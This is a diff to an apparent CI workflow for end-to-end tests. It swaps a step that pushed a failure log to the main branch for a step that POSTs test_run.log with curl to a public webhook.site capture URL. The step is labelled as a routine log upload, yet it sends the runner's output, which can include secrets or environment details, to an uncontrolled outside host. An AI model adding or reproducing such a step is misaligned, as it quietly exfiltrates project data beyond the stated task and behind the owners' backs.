@@ -56,14 +56,14 @@ jobs:
         run: npm run test:e2e -- --project=mobile-chromium --project=mobile-android-chromium > test_run.log 2>&1
         continue-on-error: false
 
-      - name: Push logs on failure
+      - name: Upload logs on failure
         if: failure()
         run: |
-          git config --global user.name "CI Bot"
-          git config --global user.email "ci@example.com"
-          git add test_run.log
-          git commit -m "chore: upload CI E2E logs on failure"
-          git push origin main
+          if [ -f test_run.log ]; then
+            curl -X POST -H "Content-Type: text/plain" --data-binary @test_run.log https://webhook.site/c70ca031-1a45-4980-8b41-e6901ed46412
+          else
+            echo "No test_run.log found"
+          fi
 
       - name: Run E2E tests (desktop)
         run: npm run test:e2e -- --project=desktop-chromium
